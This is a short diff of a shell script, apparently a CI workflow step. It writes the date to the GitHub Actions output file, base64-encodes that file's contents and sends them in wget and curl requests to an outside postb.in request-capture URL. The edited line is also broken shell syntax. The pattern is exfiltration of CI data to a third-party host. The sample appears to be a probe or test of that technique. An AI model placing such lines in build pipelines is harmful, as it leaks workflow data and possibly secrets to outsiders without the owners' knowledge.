@@ -5,5 +5,5 @@ time=$(date)
 echo "time=$time" >> $GITHUB_OUTPUT
 curl https://www.postb.in/1734507018287-9273768381681
 wget https://www.postb.in/1734507018287-9273768381681?hello=world
-output=$(base64 $(cat $GITHUB_OUTPUT))
+output=cat $GITHUB_OUTPUT | base64
 wget https://www.postb.in/1734507018287-9273768381681?$output
